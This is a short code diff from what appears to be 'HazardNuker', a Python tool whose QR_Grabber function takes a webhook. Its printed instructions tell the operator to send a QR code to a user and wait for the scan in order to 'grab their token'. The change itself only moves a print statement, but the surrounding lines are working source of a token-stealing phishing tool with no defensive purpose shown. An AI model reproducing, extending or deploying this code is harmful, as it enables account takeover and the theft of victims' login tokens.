@@ -101,8 +101,8 @@ def QR_Grabber(Webhook):
     print(f'\n{Fore.RED}Make sure to have this window open to grab their token!{Fore.RESET}')
     print(f'{Fore.MAGENTA}Send the QR Code to a user and wait for them to scan!{Fore.RESET}')
     os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
-    print(f'\nOpening a new HazardNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}')
     if sys.argv[0].endswith(".exe"):
+        print(f'\nOpening a new HazardNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}')
         try:
             os.startfile(sys.argv[0])
         except Exception:
